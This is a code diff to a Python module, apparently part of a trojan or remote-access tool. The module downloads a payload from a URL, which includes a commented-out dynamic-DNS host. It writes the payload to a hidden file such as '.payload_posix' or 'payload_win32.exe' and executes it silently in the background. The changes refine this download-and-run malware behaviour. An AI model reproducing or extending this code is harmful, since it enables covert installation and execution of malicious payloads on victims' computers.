@@ -23,14 +23,14 @@ except:
 #"https://dc619.4shared.com/img/mSMvaperce/s23/1542cfad648/Dragon_Ball_Z_Shin_Budokai_2" #
 #TODO: use free FTP server
 bin = False
-ScriptExec = "python "
+ScriptExec = "python3.5 "
 url = "http://127.0.0.1:8000/TCP_client.py"
 OsTargetpath = ".payload_posix"
 
 start = True #To decide entweder an oder aus die Zugriff
 
 def run(**args):
-  os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
+  #os.system("echo '[*] In getFileFromURI module.'>> .Tlog.log") #Todelete
   global bin, url, ScriptExec, OsTargetpath
   if os.name == 'nt':
       bin = True
@@ -38,7 +38,7 @@ def run(**args):
       OsTargetpath = "payload_win32.exe"
   elif os.name == 'posix':
       bin = False
-      ScriptExec = "python "
+      ScriptExec = "python3.5 "
       #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
       OsTargetpath = ".payload_posix"
   else:
@@ -54,8 +54,10 @@ def run(**args):
   	#os.system("echo '<urlopen error [Errno 111] Connection refused>' >> .Tlog.log")
   	return "getFileFromURI: Connection refused"
   # decode the shellcode from base64
-  shellcode = r.data  ####shellcode = base64.b64decode(r.data)
+
+  shellcode = r.data.decode("utf-8")  ####shellcode = base64.b64decode(r.data)
   cmd = ""
+
   if bin:
     mon_fichier = open(OsTargetpath, "wb")
     mon_fichier.write(shellcode)
@@ -65,13 +67,13 @@ def run(**args):
     mon_fichier = open(OsTargetpath, "w")
     mon_fichier.write(shellcode.__str__())
     mon_fichier.close()
-    cmd=ScriptExec+" "+OsTargetpath
+    cmd= ScriptExec+" "+OsTargetpath
 
   if start and os.name == 'nt': #TODO: check how to start python script
           os.system("start {}".format(cmd)) #os.system("start {}".format(OsTargetpath))
   elif start and os.name == 'posix':
-          os.system("chmod 777 {}".format(OsTargetpath))
-          os.system(cmd)
+          os.system("chmod 755 {}".format(OsTargetpath))
+          os.system(cmd +">/dev/null &")
   else:
           return ("Script is Stored under {} but never started".format(OsTargetpath))
 
@@ -79,7 +81,7 @@ def run(**args):
   return str("getFileFromURI: file {} successfully started".format(OsTargetpath))
 
 
-
+#run()
   #while not is_connected(): #if the tro execute this, so it is already connected
   #time.sleep(20)
 import socket
